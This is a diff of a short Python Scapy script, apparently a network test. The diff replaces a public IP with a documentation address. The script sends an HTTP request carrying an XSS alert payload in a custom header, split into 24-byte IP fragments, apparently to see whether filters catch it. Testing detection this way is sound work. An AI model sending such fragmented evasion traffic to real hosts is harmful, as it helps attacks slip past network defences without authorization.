@@ -1,11 +1,11 @@
 from scapy.all import IP, TCP, send, fragment
 
-ip_layer = IP(dst="52.234.30.228")
+ip_layer = IP(dst="203.0.113.10")
 tcp_layer = TCP(dport=80, sport=12345, flags="S")
 
 http_payload = (
     "GET /index.html HTTP/1.1\r\n"
-    "Host: 52.234.30.228\r\n"
+    "Host: 203.0.113.10\r\n"
     "User-Agent: ScapyTest/1.0\r\n"
     "Accept: */*\r\n"
     "Custom-Payload: <script>alert('XSS');</script>\r\n" 
@@ -18,4 +18,4 @@ packet = ip_layer / tcp_layer / http_payload
 frags = fragment(packet, fragsize=24)
 send(frags)
 
-print("Fragmented malicious packet sent to 52.234.30.228 target")
+print("Fragmented malicious packet sent to 203.0.113.10 target")
